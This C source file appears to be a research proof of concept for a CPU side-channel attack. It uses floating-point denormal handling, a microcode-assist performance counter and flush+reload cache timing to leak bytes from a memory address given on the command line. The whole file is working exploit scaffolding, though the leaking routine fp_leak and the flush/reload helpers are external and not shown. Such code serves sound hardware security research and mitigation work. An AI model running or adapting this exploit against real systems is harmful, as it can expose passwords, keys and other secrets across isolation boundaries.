#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <assert.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <unistd.h>
#include <ctype.h>
#include <pthread.h>
#include "flush_reload.h"
#include <sys/ioctl.h>
#include <linux/perf_event.h>
#include <linux/hw_breakpoint.h>
#include <asm/unistd.h>
#include <sys/syscall.h>
#include <xmmintrin.h>
#include <pmmintrin.h>

#define ITER 1000

extern  void fp_leak(unsigned char *reload_buf, char *leak_ptr);

static long perf_event_open(struct perf_event_attr *hw_event,
		pid_t pid,
		int cpu,
		int group_fd,
		unsigned long flags){
	int ret;
	ret = syscall(__NR_perf_event_open, hw_event, pid, cpu, group_fd, flags);
	return ret;
}

int main(int argc, char **argv)
{
    struct perf_event_attr microcode_assist;
    long long mc_count;
    int mc_fd;

    _MM_SET_DENORMALS_ZERO_MODE(_MM_DENORMALS_ZERO_OFF);
    _MM_SET_FLUSH_ZERO_MODE(_MM_FLUSH_ZERO_OFF);
    memset(&microcode_assist, 0, sizeof(struct perf_event_attr));

    microcode_assist.type = PERF_TYPE_RAW;
    microcode_assist.size = sizeof(struct perf_event_attr);
    microcode_assist.config = 0x01C3;
    microcode_assist.disabled = 1;
    microcode_assist.exclude_kernel = 1;
    microcode_assist.exclude_hv = 1;

    mc_fd = perf_event_open(&microcode_assist, 0, -1, -1, 0);
    if(mc_fd == -1){
    	printf("failed to initialize perfmon file descriptors\n");
	exit(0);
    }

    uint64_t leak_addr;
    uint32_t leak_length;
    uint8_t *leak_ptr;
    int ret;

    if (argc > 2)
    {
        sscanf(argv[1], "0x%lx", &leak_addr);
        sscanf(argv[2], "%d", &leak_length);
        leak_ptr = (uint8_t *) leak_addr;
    }
    else
    {
        leak_ptr = "This is a test to verify that is leaks";
        leak_length = strlen(leak_ptr);
    }

    /* Setup */
    __attribute__((aligned(4096))) size_t results[LEAK_SIZE] = {0};
    unsigned char *reload_buf   = (unsigned char *) mmap(NULL, LEAK_SIZE*STRIDE, PROT_READ | PROT_WRITE,
                                                         MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0);
    assert(reload_buf != MAP_FAILED);

    for(int i=0; i<leak_length; i++)
    {
        memset(results, 0, sizeof(results));

        for(int j=0; j<ITER; j++)
        {
            flush(reload_buf); 
	    fp_leak(reload_buf, leak_ptr+i); 
            reload(reload_buf, results);
        }

        printf("0x%016lx :\n", (uint64_t)(leak_ptr+i));
        print_results(results, ITER/10);
    }

    return 0;    
}

